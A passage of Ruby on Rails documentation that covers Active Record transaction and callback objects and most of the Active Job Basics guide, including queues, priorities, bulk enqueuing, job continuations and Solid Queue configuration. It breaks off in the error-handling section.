[`ActiveRecord.after_all_transactions_commit`][] is a callback that allows you to run code after all the current transactions have been successfully committed to the database.

```ruby
def publish_article(article)
  Article.transaction do
    Post.transaction do
      ActiveRecord.after_all_transactions_commit do
        PublishNotificationMailer.with(article: article).deliver_later
        # An email will be sent after the outermost transaction is committed.
      end
    end
  end
end
```

A callback registered to `after_all_transactions_commit` will be triggered after the outermost transaction is committed. If any of the currently open transactions is rolled back, the block is never called.
In the event that there are no open transactions at the time a callback is registered, the block will be yielded immediately.

[`ActiveRecord.after_all_transactions_commit`]: https://api.rubyonrails.org/classes/ActiveRecord.html#method-c-after_all_transactions_commit

Callback Objects
----------------

Sometimes the callback methods that you'll write will be useful enough to be
reused by other models. Active Record makes it possible to create classes that
encapsulate the callback methods, so they can be reused.

Here's an example of an `after_commit` callback  class to deal with the cleanup
of discarded files on the filesystem. This behavior may not be unique to our
`PictureFile` model and we may want to share it, so it's a good idea to
encapsulate this into a separate class. This will make testing that behavior and
changing it much easier.

```ruby
class FileDestroyerCallback
  def after_commit(file)
    if File.exist?(file.filepath)
      File.delete(file.filepath)
    end
  end
end
```

When declared inside a class, as above, the callback methods will receive the
model object as a parameter. This will work on any model that uses the class
like so:

```ruby
class PictureFile < ApplicationRecord
  after_commit FileDestroyerCallback.new
end
```

Note that we needed to instantiate a new `FileDestroyerCallback` object, since
we declared our callback as an instance method. This is particularly useful if
the callbacks make use of the state of the instantiated object. Often, however,
it will make more sense to declare the callbacks as class methods:

```ruby
class FileDestroyerCallback
  def self.after_commit(file)
    if File.exist?(file.filepath)
      File.delete(file.filepath)
    end
  end
end
```

When the callback method is declared this way, it won't be necessary to
instantiate a new `FileDestroyerCallback` object in our model.

```ruby
class PictureFile < ApplicationRecord
  after_commit FileDestroyerCallback
end
```

You can declare as many callbacks as you want inside your callback objects.


<!-- ===== guides/source/active_job_basics.md ===== -->

**DO NOT READ THIS FILE ON GITHUB, GUIDES ARE PUBLISHED ON
<https://guides.rubyonrails.org>.**

Active Job Basics
=================

This guide provides you with all you need to get started in creating, enqueuing
and executing background jobs.

After reading this guide, you will know:

* How to create and enqueue jobs.
* How to configure and use Solid Queue.
* How to run jobs in the background.
* How to send emails from your application asynchronously.
* How to write jobs that pause and resume progress during deploys.

--------------------------------------------------------------------------------

What is Active Job?
-------------------

The Active Job Rails framework allows you to declare background jobs and execute
them on a queuing backend. It provides a consistent, high-level interface for
common asynchronous tasks such as sending emails, processing data, or performing
periodic maintenance tasks.

The goal of background jobs is to move long-running or non-critical work out of
the HTTP request-response cycle and into a background queue (such as the default
Solid Queue), and keep the web requests fast and responsive. This separation
allows applications to perform work asynchronously, scale background processing
independently, and execute multiple tasks in parallel without blocking user
interactions.

Creating Jobs
-------------

This section provides a step-by-step guide for defining a job Ruby class and
then using the `perform_*` method to enqueue work to be executed in the
background.

### Defining a Job

Active Job provides a Rails generator to create jobs. The following will create
a job in the `app/jobs` directory (with tests under `test/jobs`):

```bash
$ bin/rails generate job guests_cleanup
invoke  test_unit
create    test/jobs/guests_cleanup_job_test.rb
create  app/jobs/guests_cleanup_job.rb
```

If you don't want to use a generator, you can create your own file inside of
`app/jobs` and define a class that inherits from `ApplicationJob`.

Here's what a job looks like:

```ruby
class GuestsCleanupJob < ApplicationJob
  queue_as :default

  def perform(*guests)
    # Do something later
  end
end
```

Note that you can define the `perform` method inside a job class with as many
arguments as you want.

If your application uses a custom abstract job base class instead of
`ApplicationJob`, you can use the `--parent` option with the generator. The
parent class must itself inherit from `ApplicationJob`. This can be useful for
grouping related functionality in one place.

For example, given a custom abstract job class using
[queue_as](https://api.rubyonrails.org/classes/ActiveJob/QueueName/ClassMethods.html#method-i-queue_as):

```ruby
class PaymentJob < ApplicationJob
  queue_as :payments
end
```

You can generate a new job that inherits from it:

```bash
$ bin/rails generate job process_payment --parent=payment_job
```

The above creates a class that will use the `payments` queue:

```ruby
class ProcessPaymentJob < PaymentJob
  def perform(*args)
    # Do something later, uses the "payments" queue
  end
end
```

### Calling the `perform_*` Methods

Once you have defined a job class with a `perform` method, you'd typically call
it using [`perform_later`][] to enqueue the work to be executed on a queuing
backend. Or use [`perform_now`][] if you want the job to execute immediately
without queueing. Both `perform_later` and `perform_now` call `perform` under
the hood.

In the examples below, the methods can be called from anywhere in your Rails
application, most commonly from controllers, models, or other jobs.

```ruby
# To run a job immediately without enqueuing it
GuestsCleanupJob.perform_now(guest)

# To enqueue a job to be performed later
GuestsCleanupJob.perform_later(guest)
```

Use the
[`set`](https://api.rubyonrails.org/classes/ActiveJob/Core/ClassMethods.html#method-i-set)
method to specify exactly when to perform a job.

```ruby
# Enqueue a job to be performed tomorrow at noon
GuestsCleanupJob.set(wait_until: Date.tomorrow.noon).perform_later(guest)

# Enqueue a job to be performed one week from now
GuestsCleanupJob.set(wait: 1.week).perform_later(guest)
```

Since both `perform_now` and `perform_later` forward their arguments to
`perform`, you can pass as many arguments as defined in `perform`, including
keyword arguments:

```ruby
GuestsCleanupJob.perform_later(guest1, guest2, filter: "some_filter")
```

#### Example: Sending Email

One of the most common jobs in a modern web application is sending emails to
users. Active Job can do this outside of the request-response cycle, so the user
doesn't have to wait on it. Active Job is integrated with Action Mailer so you
can easily send emails asynchronously:

```ruby
# If you want to send the email now, use #deliver_now
UserMailer.welcome(@user).deliver_now

# If you want to send the email asynchronously, use #deliver_later
UserMailer.welcome(@user).deliver_later
```

The `deliver_now` and `deliver_later` methods are Action Mailer's counterparts
to `perform_now` and `perform_later`. Under the hood, `deliver_later` works by
enqueuing an `ActionMailer::MailDeliveryJob` — a built-in Active Job job that
Rails provides — which goes through the same queuing pipeline as any job you
define yourself, and will eventually call the `perform` method in your Job
class.

[`perform_now`]:
    https://api.rubyonrails.org/classes/ActiveJob/Execution.html#method-i-perform_now
[`perform_later`]:
 https://api.rubyonrails.org/classes/ActiveJob/Enqueuing/ClassMethods.html#method-i-perform_later
[`set`]:
    https://api.rubyonrails.org/classes/ActiveJob/Core/ClassMethods.html#method-i-set

### Supported Argument Types for `perform`

ActiveJob supports the following types of arguments by default:

  - Basic types (`NilClass`, `String`, `Integer`, `Float`, `BigDecimal`,
    `TrueClass`, `FalseClass`)
  - `Symbol`
  - `Date`
  - `Time`
  - `DateTime`
  - `ActiveSupport::TimeWithZone`
  - `ActiveSupport::Duration`
  - `Hash` (Keys should be of `String` or `Symbol` type)
  - `ActiveSupport::HashWithIndifferentAccess`
  - `Array`
  - `Range`
  - `Module`
  - `Class`

Active Job supports
[GlobalID](https://github.com/rails/globalid/blob/main/README.md) for arguments.
This makes it possible to pass live Active Record objects to your job instead of
class/id pairs, which you then have to manually deserialize.

For example, instead of having to do something like this:

```ruby
class GuestsCleanupJob < ApplicationJob
  def perform(guests_class, guests_id, depth)
    guests = guests_class.constantize.find(guests_id)
    guest.cleanup(depth)
  end
end
```

Using GlobalID, you can simply do:

```ruby
class GuestsCleanupJob < ApplicationJob
  def perform(guest, depth)
    guest.cleanup(depth)
  end
end
```

This works with any class that mixes in `GlobalID::Identification`, which is
mixed into Active Record by default.

#### Add Custom Types by Defining Serializers

You can extend the list of supported argument types by defining your own
serializer for your custom types. A serializer needs three methods: `serialize`,
`deserialize`, and `klass`.

The `serialize` method converts an object into a simpler representation using
only supported types. The recommended approach is to return a Hash with string
keys, calling `super` to let Active Job merge in the serializer's type
information:

```ruby
# app/serializers/money_serializer.rb
class MoneySerializer < ActiveJob::Serializers::ObjectSerializer
  def serialize(money)
    super(
      "amount" => money.amount,
      "currency" => money.currency
    )
  end

  def deserialize(hash)
    Money.new(hash["amount"], hash["currency"])
  end

  def klass
    Money
  end
end
```

The `deserialize` method receives that hash and reconstructs the original
object. The `klass` method returns the class this serializer handles so Active
Job can use it to determine which serializer to apply to a given argument.

Once a serializer is defined, it needs to be added to the list of serializers
Rails knows about:

```ruby
# config/initializers/custom_serializers.rb
Rails.application.config.active_job.custom_serializers << MoneySerializer
```

Custom Active Job serializers are registered during application initialization
and are expected to remain stable for the lifetime of the process. Reloadable
autoloading is not supported in this context.

To ensure serializers are loaded only once (and not reloaded in development),
place them in an autoload_once_paths directory, such as:

```ruby
# config/application.rb
module YourApp
  class Application < Rails::Application
    config.autoload_once_paths << "#{root}/app/serializers"
  end
end
```

Enqueuing Jobs
--------------

### Naming Queues

With Active Job you can schedule the job to run on a specific queue using
[`queue_as`][]:

```ruby
class GuestsCleanupJob < ApplicationJob
  queue_as :low_priority
  # ...
end
```

When using a generator, you can also create a job that will run on a specific
queue:

```bash
$ bin/rails generate job guests_cleanup --queue low_priority
```

You can prefix the queue name for all your jobs using
[`config.active_job.queue_name_prefix`][] in `application.rb`:

```ruby
# config/application.rb
module YourApp
  class Application < Rails::Application
    config.active_job.queue_name_prefix = Rails.env
  end
end
```

```ruby
# app/jobs/guests_cleanup_job.rb
class GuestsCleanupJob < ApplicationJob
  queue_as :low_priority
  # ...
end
```

Now your job will run on queue `production_low_priority` on your production
environment and on `staging_low_priority` on your staging environment.

You can also configure the prefix on a per job basis.

```ruby
# This will override the global prefix and this job won't be prefixed.
class GuestsCleanupJob < ApplicationJob
  queue_as :low_priority
  self.queue_name_prefix = nil
  # ...
end
```

The default queue name prefix delimiter is '_'.  This can be changed by setting
[`config.active_job.queue_name_delimiter`][] in `application.rb`:

```ruby
# config/application.rb
module YourApp
  class Application < Rails::Application
    config.active_job.queue_name_prefix = Rails.env
    config.active_job.queue_name_delimiter = "."
  end
end
```

```ruby
# app/jobs/guests_cleanup_job.rb
class GuestsCleanupJob < ApplicationJob
  queue_as :low_priority
  # ...
end
```

Now the queue will be named `production.low_priority` or `staging.low_priority`.

You can control the queue at the job level by passing a block to `queue_as`. The
block will be executed in the job context (so it can access `self.arguments`),
and it's return value must be a queue name. For example:

```ruby
class ProcessVideoJob < ApplicationJob
  queue_as do
    video = self.arguments.first
    if video.owner.premium?
      :premium_videojobs
    else
      :videojobs
    end
  end

  def perform(video)
    # Do process video
  end
end
```

```ruby
last_video = Video.last
ProcessVideoJob.perform_later(last_video)
```

If you want more control on what queue a job will be run you can pass a `:queue`
option to `set`:

```ruby
MyJob.set(queue: :another_queue).perform_later(record)
```

TIP: One way to name queues is based on latency. So instead of "critical",
"default", or "low", queues could be named "within_30_seconds",
"within_5_minutes", and "within_1_hour". This can be enforced like a contract by
configuring your queuing backend to notify your engineering team if a job sits
in a given queue longer than the corresponding time.

NOTE: If you choose to use an [alternate queuing
backend](#alternate-queuing-backends) you may need to specify the queues to
listen to.

[`config.active_job.queue_name_delimiter`]:
    configuring.html#config-active-job-queue-name-delimiter
[`config.active_job.queue_name_prefix`]:
    configuring.html#config-active-job-queue-name-prefix
[`queue_as`]:
    https://api.rubyonrails.org/classes/ActiveJob/QueueName/ClassMethods.html#method-i-queue_as

### Queue Priority

You can schedule a job to run with a specific priority using
`queue_with_priority`:

```ruby
class GuestsCleanupJob < ApplicationJob
  queue_with_priority 10
  # ...
end
```

Solid Queue, the default queuing backend, prioritizes jobs based on the [order
of the queues](#queue-order). If you're using Solid Queue with both queue order
and priority option, the queue order will take precedence, and the priority
option will only apply within each queue.

Other queuing backends may allow jobs to be prioritized relative to others
within the same queue or across multiple queues. You can check the documentation
of your backend for the specifics.

Similar to `queue_as`, you can also pass a block to `queue_with_priority` to be
evaluated in the job context:

```ruby
class ProcessVideoJob < ApplicationJob
  queue_with_priority do
    video = self.arguments.first
    if video.owner.premium?
      0
    else
      10
    end
  end

  def perform(video)
    # Process video
  end
end
```

```ruby
last_video = Video.last
ProcessVideoJob.perform_later(last_video)
```

You can also pass a `:priority` option to `set`:

```ruby
MyJob.set(priority: 50).perform_later(record)
```

NOTE: If a lower priority number performs before or after a higher priority
number depends on the adapter implementation. Refer to the documentation of your
backend for more information. Adapter authors are encouraged to treat a lower
number as more important, as a convention.

[`queue_with_priority`]:
    https://api.rubyonrails.org/classes/ActiveJob/QueuePriority/ClassMethods.html#method-i-queue_with_priority

### Bulk Enqueuing

You can enqueue multiple jobs at once using
[`perform_all_later`](https://api.rubyonrails.org/classes/ActiveJob.html#method-c-perform_all_later).
Bulk enqueuing reduces the number of round trips to the queue data store (such
as Redis or a database), making it a more performant operation than enqueuing
the same jobs individually.

The `perform_all_later` method accepts instantiated jobs as arguments (note that
this is different from `perform_later`) and calls `perform` under the hood. The
arguments passed to `new`, when creating new job instances, will be passed on to
`perform` when it's eventually called. For example:

```ruby
# Create jobs to pass to `perform_all_later`.
# The arguments to `new` are passed on to `perform`
cleanup_jobs = Guest.all.map { |guest| GuestsCleanupJob.new(guest) }

# Will enqueue a separate job for each instance of `GuestsCleanupJob`
ActiveJob.perform_all_later(cleanup_jobs)

# Can also use `set` method to configure options before bulk enqueuing jobs.
cleanup_jobs = Guest.all.map { |guest| GuestsCleanupJob.new(guest).set(wait: 1.day) }

ActiveJob.perform_all_later(cleanup_jobs)
```

The `perform_all_later` call logs the number of jobs successfully enqueued, for
example if `Guest.all.map` above resulted in 3 `cleanup_jobs`, it would log
`Enqueued 3 jobs to Async (3 GuestsCleanupJob)` (assuming all were enqueued).

The return value of `perform_all_later` is `nil`. Note that this is different
from `perform_later`, which returns the instance of the queued job class.

#### Enqueue Multiple Active Job Classes

With `perform_all_later`, it's also possible to enqueue different Active Job
class instances in the same call. For example:

```ruby
class ExportDataJob < ApplicationJob
  def perform(*args)
    # Export data
  end
end

class NotifyGuestsJob < ApplicationJob
  def perform(*guests)
    # Email guests
  end
end

# Instantiate job instances
cleanup_job = GuestsCleanupJob.new(guest)
export_job = ExportDataJob.new(data)
notify_job = NotifyGuestsJob.new(guest)

# Enqueues job instances from multiple classes at once
ActiveJob.perform_all_later(cleanup_job, export_job, notify_job)
```

#### Bulk Enqueue Callbacks

When enqueuing jobs in bulk using `perform_all_later`, callbacks such as
`around_enqueue` will not be triggered on the individual jobs. This behavior is
in line with other Active Record bulk methods. Since callbacks run on individual
jobs, they can't take advantage of the bulk nature of this method.

However, the `perform_all_later` method does fire an
[`enqueue_all.active_job`](active_support_instrumentation.html#enqueue-all-active-job)
event which you can subscribe to using `ActiveSupport::Notifications`.

The method
[`successfully_enqueued?`](https://api.rubyonrails.org/classes/ActiveJob/Core.html#method-i-successfully_enqueued-3F)
can be used to find out if a given job was successfully enqueued.

#### Queue Backend Support

For `perform_all_later`, bulk enqueuing needs to be backed by the queue backend.
Solid Queue, the default queue backend, supports bulk enqueuing using
`enqueue_all`.

[Other backends](#alternate-queuing-backends) like Sidekiq have a `push_bulk`
method, which the Sidekiq adapter users. internally to push a large number of
jobs to Redis and prevent the round trip network latency. GoodJob also supports
bulk enqueuing with the `GoodJob::Bulk.enqueue` method.

If the queue backend does *not* support bulk enqueuing, `perform_all_later` will
enqueue jobs one by one.

Callbacks
---------

Active Job provides hooks to trigger logic during the life cycle of a job. Like
other callbacks in Rails, you can implement them as ordinary methods and
register them using a class-level method:

```ruby#4
class GuestsCleanupJob < ApplicationJob
  queue_as :default

  around_perform :around_cleanup

  def perform
    # Do something later
  end

  private
    def around_cleanup
      # Do something before perform
      yield
      # Do something after perform
    end
end
```

These class-level methods also accept a block, which works well when the
callback logic is short enough to fit on a single line. For example, sending
metrics for every enqueued job:

```ruby
class ApplicationJob < ActiveJob::Base
  before_enqueue { |job| Rails.logger.info "Enqueuing #{job.class.name}" }
end
```

### Available Callbacks

There are several callbacks that Active Job supports.

* [`before_enqueue`][] runs before a job is enqueued.
* [`around_enqueue`][] wraps the enqueuing process, allowing logic to run both
  before and after.
* [`after_enqueue`][] runs after a job is enqueued.

For example:

```ruby
class GuestsCleanupJob < ApplicationJob
  before_enqueue { |job| Rails.logger.info "About to enqueue #{job.class.name}" }
  around_enqueue { |job, block| block.call }
  after_enqueue  { |job| Rails.logger.info "Successfully enqueued #{job.class.name}" }
end
```

* [`before_perform`][] runs before a job is performed.
* [`around_perform`][] wraps the perform process, allowing logic to run both
  before and after.
* [`after_perform`][] runs after a job is performed.

For example:

```ruby
class GuestsCleanupJob < ApplicationJob
  before_perform { |job| Rails.logger.info "About to perform #{job.class.name}" }
  around_perform { |job, block| block.call }
  after_perform  { |job| Rails.logger.info "#{job.class.name} performed successfully" }
end
```

Lastly, [`after_discard`][] runs when a job is discarded due to an unhandled
exception:

```ruby
class GuestsCleanupJob < ApplicationJob
  after_discard { |job, exception| Rails.logger.error "#{job.class.name} discarded: #{exception.message}" }
end
```

Please note that when enqueuing jobs in bulk using `perform_all_later`,
callbacks such as `around_enqueue` will not be triggered on the individual jobs.
See [Bulk Enqueuing Callbacks](#bulk-enqueue-callbacks).

[`before_enqueue`]:
 https://api.rubyonrails.org/classes/ActiveJob/Callbacks/ClassMethods.html#method-i-before_enqueue
[`around_enqueue`]:
https://api.rubyonrails.org/classes/ActiveJob/Callbacks/ClassMethods.html#method-i-around_enqueue
[`after_enqueue`]:
    https://api.rubyonrails.org/classes/ActiveJob/Callbacks/ClassMethods.html#method-i-after_enqueue
[`before_perform`]:
https://api.rubyonrails.org/classes/ActiveJob/Callbacks/ClassMethods.html#method-i-before_perform
[`around_perform`]:
https://api.rubyonrails.org/classes/ActiveJob/Callbacks/ClassMethods.html#method-i-around_perform
[`after_perform`]:
https://api.rubyonrails.org/classes/ActiveJob/Callbacks/ClassMethods.html#method-i-after_perform
[`after_discard`]:
https://api.rubyonrails.org/classes/ActiveJob/Exceptions/ClassMethods.html#method-i-after_discard

### Halting Callbacks

You can halt the callback chain by throwing `:abort`. This works the same way as
in Active Record and other Rails callbacks. For example, to prevent a job from
being enqueued based on a condition:

```ruby
class GuestsCleanupJob < ApplicationJob
  before_enqueue do |job|
    throw :abort if ENV.fetch("DISABLE_GUESTS_CLEANUP_JOB", true)
  end

  def perform(guest)
    # ...
  end
end
```

When `:abort` is thrown in a `before_enqueue` callback, the job will not be
enqueued and `perform_later` will return `false`. When thrown in a
`before_perform` callback, the job will not be performed. It will also skip the
execution of any subsequent before, around and after callbacks.

NOTE: Throwing an `:abort` does not trigger `after_discard`. The `after_discard`
callback is specifically tied to the `discard_on` mechanism.

Job Continuations
-----------------

Active Job Continuations allow jobs to be split into resumable steps, so that
long-running jobs can make progress after interruptions. When using
continuations, the job automatically resumes from the last completed step,
instead of restarting from the beginning.

To use continuations, include the `ActiveJob::Continuable` module in your Job
class. You can then define each step inside the `perform` method using
[`step`](https://api.rubyonrails.org/classes/ActiveJob/Continuation/Step.html).

```ruby
class ProcessImportJob < ApplicationJob
  include ActiveJob::Continuable

  def perform(import_id)
    # Always runs on job start, even when resuming from an interrupted step.
    @import = Import.find(import_id)

    # Step defined using a block
    step :initialize do
      @import.initialize
    end

    step :process do
      @import.records.find_each { |record| record.process }
    end

    # Step defined by referencing a method
    step :finalize
  end

  private
    def finalize
      @import.finalize
    end
end
```

Each step can be declared with a block or by referencing a method name. The
block will be called with the step object as an argument. Methods can either
take no arguments or a single argument for the step object.

Steps are executed as soon as they are encountered. Code that is not part of a
step will be executed on each job run. If a job is interrupted, previously
completed steps will be skipped. If a step is in progress, it will be restarted
or resumed with the last recorded cursor if using cursors.

### Using a Cursor

Steps can also use an optional
[cursor](https://api.rubyonrails.org/classes/ActiveJob/Continuation.html#class-ActiveJob::Continuation-label-Cursors)
to track progress *within* the step. The code in the step is responsible for
using the cursor to continue from the appropriate location after an
interruption. For example:

```ruby
class ProcessImportJob < ApplicationJob
  include ActiveJob::Continuable

  def perform(import_id)
    # Always runs on job start, even when resuming from an interrupted step.
    @import = Import.find(import_id)

    # Step with a cursor
    step :process do |step|
      @import.records.find_each(start: step.cursor) do |record|
        record.process
        step.advance!
      end
    end

  end
end
```

In the above example, the cursor tracks the `id` of the last successfully
processed record. If the job is interrupted midway through a large import, it
resumes from where it left off rather than reprocessing records from the
beginning, passing the saved cursor value to `find_each`.

### Job Attributes

The continuable steps may need to share state. Active Job attributes let jobs
declare typed state using the [`Active Model Attributes API`][], so that values
computed in one step are available in later steps. Attribute values are
serialized when the job is interrupted or retried, and restored when the job
resumes. `ActiveJob::Continuable` includes [`ActiveJob::Attributes`][], so
continuable jobs can declare attributes directly.

In the example below, the `payment_token` and `billing_profile_id` attributes
are declared at the class level so their values are preserved across
interruptions. They are computed in `tokenize_payment_instrument` step and used
in the `submit_enrollment` step later:

```ruby
class SubmitEnrollmentJob < ApplicationJob
  include ActiveJob::Continuable

  attribute :payment_token, :string
  attribute :billing_profile_id, :integer

  def perform(enrollment)
    step :tokenize_payment_instrument do
      self.payment_token = PaymentGateway.tokenize(enrollment.user.payment_instrument)
    end

    step :create_billing_profile do
      self.billing_profile_id = BillingProfileApi.create(customer_id: enrollment.user_id)
    end

    # payment_token and billing_profile_id are restored from the serialized
    # job state when resuming here after an interruption.
    step :submit_enrollment do
      submission_id = EnrollmentApi.submit(enrollment, payment_token, billing_profile_id)
      enrollment.update!(status: "processing", submission_id: submission_id)
    end
  end
end
```

Attribute values must be serializable as Active Job supported argument types. For more details, see [`ActiveJob::Attributes`][].

[`Active Model Attributes API`]:
    https://api.rubyonrails.org/classes/ActiveModel/Attributes.html
[`ActiveJob::Attributes`]:
    https://api.rubyonrails.org/classes/ActiveJob/Attributes.html

Job Continuations make it easier to build long-running or multi-phase jobs that
can safely pause and resume without losing progress. For more details, see
[ActiveJob::Continuation](https://api.rubyonrails.org/classes/ActiveJob/Continuation.html).

Default Backend: Solid Queue
------------------------------

Solid Queue is a database-backed queue backend for Active Job and the default
queue backend for Rails version 8.0 onwards. Rather than requiring a separate
infrastructure dependency like Redis, Solid Queue uses your existing database to
persist and process jobs. It supports delayed jobs, job priorities, concurrency
controls, recurring jobs, and bulk enqueuing.

### Setup and Default Configuration

Solid Queue is already configured for production by default. For example, if you
open `config/environments/production.rb`, you will see the following:

```ruby#3
# config/environments/production.rb
# Replace the default in-process and non-durable queuing backend for Active Job.
config.active_job.queue_adapter = :solid_queue
config.solid_queue.connects_to = { database: { writing: :queue } }
```

Additionally, the database connection for the `queue` database is configured in
`config/database.yml`:

```yaml#8
# config/database.yml
# Store production database in the storage/ directory, which by default
# is mounted as a persistent Docker volume in config/deploy.yml.
production:
  primary:
    <<: *default
    database: storage/production.sqlite3
  queue:
    <<: *default
    database: storage/production_queue.sqlite3
    migrations_paths: db/queue_migrate
```

NOTE: The key `queue` from the database configuration needs to match the key
used in the configuration for `config.solid_queue.connects_to` (as highlighted
in the code snippets above).

In order to start using Solid Queue, run `db:prepare` so your database has Solid
Queue related tables:

```bash
$ bin/rails db:prepare
```

TIP: You can find the schema for the `queue` database in `db/queue_schema.rb`,
which is generated automatically. It will contain tables like
`solid_queue_jobs`, `solid_queue_recurring_executions`,
`solid_queue_scheduled_executions`, and more.

Finally, to start the queue and start processing jobs you can run:

```bash
$ bin/jobs start
```

#### Development Environment

Rails provides an asynchronous in-process queuing backend, which keeps the jobs
in memory. With the default `async` adapter, if the process crashes or the
machine is reset, then all outstanding jobs are lost. This can be acceptable for
non-critical jobs in development.

Alternatively, you can use Solid Queue in development. It can be configured in
the same way as in the production environment:

```ruby#3
# config/environments/development.rb
config.active_job.queue_adapter = :solid_queue
config.solid_queue.connects_to = { database: { writing: :queue } }
```

Add `queue` to the development database configuration:

```yml
# config/database.yml
development:
  primary:
    <<: *default
    database: storage/development.sqlite3
  queue:
    <<: *default
    database: storage/development_queue.sqlite3
    migrations_paths: db/queue_migrate
```

### Workers, Dispatchers, Supervisors

Solid Queue uses three types of processes to handle job queueing and execution:

1. Workers poll queues for jobs that are ready to run and execute them.
2. Dispatchers handle scheduled jobs — they check for jobs due to run in the
future and move them into the ready queue for workers to pick up.
3. A Supervisor manages both workers and dispatchers, by forking and monitoring
   them.

When you run `bin/jobs start`, you're starting the supervisor process, which in
turn forks and manages the workers and dispatchers according to the
configuration in `config/queue.yml`. Here is an example of the default
configuration:

```yaml
# config/queue.yml
default: &default
  dispatchers:
    - polling_interval: 1
      batch_size: 500
  workers:
    - queues: "*"
      threads: 3
      processes: <%= ENV.fetch("JOB_CONCURRENCY", 1) %>
      polling_interval: 0.1
```

The configuration in `config/queue.yml` is optional. If no configuration is
provided, Solid Queue will run with one dispatcher and one worker with default
settings. Below are some of the configuration options you can set along with
their default values`:

| **Option**                           | **Description**                                                                                     | **Default Value**                             |
| ------------------------------------ | --------------------------------------------------------------------------------------------------- | --------------------------------------------- |
| **polling_interval**                 | Time in seconds workers/dispatchers wait before checking for more jobs.                             | 1 second (dispatchers), 0.1 seconds (workers) |
| **batch_size**                       | Number of jobs dispatched in a batch.                                                               | 500                                           |
| **concurrency_maintenance_interval** | Time in seconds the dispatcher waits before checking for blocked jobs that can be unblocked.        | 600 seconds                                   |
| **queues**                           | List of queues workers fetch jobs from. Supports `*` for all queues or queue name prefixes.         | `*`                                           |
| **threads**                          | Maximum size of the thread pool for each worker. Determines how many jobs a worker fetches at once. | 3                                             |
| **processes**                        | Number of worker processes forked by the supervisor. Each process can dedicate a CPU core.          | 1                                             |
| **concurrency_maintenance**          | Whether the dispatcher performs concurrency maintenance work.                                       | true                                          |

You can read more about these [configuration options in the Solid Queue
documentation](https://github.com/rails/solid_queue?tab=readme-ov-file#configuration).
There are also [additional configuration
options](https://github.com/rails/solid_queue?tab=readme-ov-file#other-configuration-settings)
that can be set in `config/<environment>.rb` to further configure Solid Queue in
your Rails Application.

### Queue Order and Priority

Solid Queue offers two distinct mechanisms for controlling the order in which
jobs are processed: queue ordering and numeric priorities. Understanding how
they interact is important for getting the behavior you expect.

#### Queue Order

Queue order is the primary way to prioritize work in Solid Queue. The order in
which queues are listed in `config/queue.yml` for a worker determines the
polling order. A worker will not pull jobs from a lower priority queue (listed
later in the array) until all higher priority queues are empty:

```yaml
production:
  workers:
    - queues: [critical, default, low]
      threads: 5
```

With the above configuration, no jobs will be taken from the `default` queue
while the `critical` queue has jobs waiting, and no jobs will be taken from
`low` while either `critical` or `default` has jobs waiting. Solid Queue has
strict ordering (unlike other queuing backend which may allow relative weights
so that lower priority queues still receive a proportional share of processing
time). It is possible for lower queues to be starved if higher queues are
consistently busy.

It is possible to use a wildcard `*` within queue names. For example if the
worker is configured with `queues:[active_storage*, mailers]`, it will fetch
jobs from queues starting with "active_storage", such as  the
`active_storage_analyze` queue and `active_storage_transform` queue. Only when
no jobs remain in the `active_storage`-prefixed queues will workers move on to
the `mailers` queue.

WARNING: Using wildcard queue names (e.g., `queues: active_storage*`) can slow
down polling performance in SQLite and PostgreSQL due to the need for a
`DISTINCT` query to identify all matching queues, which can be slow on large
tables. For better performance, it’s best to specify exact queue names instead
of using wildcards.

#### Numeric Priorities

Numeric priorities apply *within* a single queue. You can assign numeric
priorities to jobs using `queue_with_priority`. Lower numbers indicate higher
priority, with a default of 0:

```ruby
class CriticalReportJob < ApplicationJob
  queue_as :default
  queue_with_priority 0
end

class RoutineCleanupJob < ApplicationJob
  queue_as :default
  queue_with_priority 10
end
```

When both jobs are in the `default` queue, `CriticalReportJob` will be picked up
first. However, numeric priority only applies within a queue. It has no effect
across queues. Queue order takes precedence, if you are using both mechanisms
together.

#### Polling Interval

For Solid Queue the `polling_interval` setting for a worker directly affects how
quickly it picks up new jobs. A high-priority queue paired with a slow polling
interval may not feel very responsive in practice:

```yaml
production:
  workers:
    - queues: critical
      threads: 5
      polling_interval: 0.1  # Poll every 100ms — fast response
    - queues: low
      threads: 2
      polling_interval: 10   # Poll every 10s — fine for low-priority work
```

Tuning `polling_interval` per worker is especially important for time-sensitive
queues.

#### Retries

In Solid Queue, retries need to be configured explicitly using Active Job's
`retry_on`:

```ruby
class ExternalApiJob < ApplicationJob
  retry_on Net::TimeoutError, wait: :exponentially_longer, attempts: 5
  retry_on ActiveRecord::Deadlocked, wait: 2.seconds, attempts: 3

  def perform
    # ...
  end
end
```

This can also be set globally in `ApplicationJob` if you want a default retry
policy across all jobs. Failed jobs that aren't configured with `retry_on` will
go straight to failed executions without retrying.

### Concurrency Controls

Solid Queue extends Active Job with concurrency controls, allowing you to limit
how many jobs of a certain type can run at the same time. This is useful for
protecting shared resources, such as ensuring only one export job runs per
account at a time, or capping the number of concurrent API calls to an external
service.

Concurrency controls are declared using `limits_concurrency` in your job class:

```ruby
class InvoiceExportJob < ApplicationJob
  limits_concurrency to: 1, key: ->(account_id) { "invoice_export_#{account_id}" }, duration: 10.minutes

  def perform(account_id)
    # ...
  end
end
```

In the above example:

- The `:to` option sets the maximum number of jobs that can run concurrently.
- The `:key` lambda computes a concurrency key from the job's arguments. In the
  example above, the limit of 1 applies per account rather than globally.
- The `:duration` option acts as a failsafe. So if a worker dies mid-job and
  fails to release its lock, any blocked jobs become candidates for release once
  duration has elapsed.

When a job with concurrency controls is enqueued, Solid Queue checks a
database-backed lock for the computed key. If the lock is available, the job is
marked ready for execution. If not, the behavior depends on the `:on_conflict`
option. If `on_conflict` is set to `:block` (the default), the job is held in a
blocked state and marked ready only when a running job finishes. The other
option is `:discard`, in which case the job is dropped entirely.

You can also scope limits across *different* job classes using the `:group`
option:

```ruby
class AnalyticsExportJob < ApplicationJob
  limits_concurrency to: 1, key: ->(account_id) { account_id }, group: "account_exports", duration: 10.minutes
end

class InvoiceExportJob < ApplicationJob
  limits_concurrency to: 1, key: ->(account_id) { account_id }, group: "account_exports", duration: 10.minutes
end
```

In the above example, both job classes share the same concurrency limit per the
"account_exports" group, which means only one export of either type will run at
a time for a given account.

NOTE: Concurrency controls do carry overhead since blocked executions must be
tracked and locks created and updated. So they should be used sparingly. For
simple throughput limiting, constraining the number of worker threads per queue
is more efficient.

WARNING: Concurrency controls are not compatible with bulk enqueuing via
`perform_all_later`. Since concurrency-controlled jobs need to be enqueued
one-by-one to respect the configured limits.

### Error handling

Solid Queue raises `SolidQueue::Job::EnqueueError` when an Active Record error
occurs during job enqueuing. This differs from `ActiveJob::EnqueueError`, which
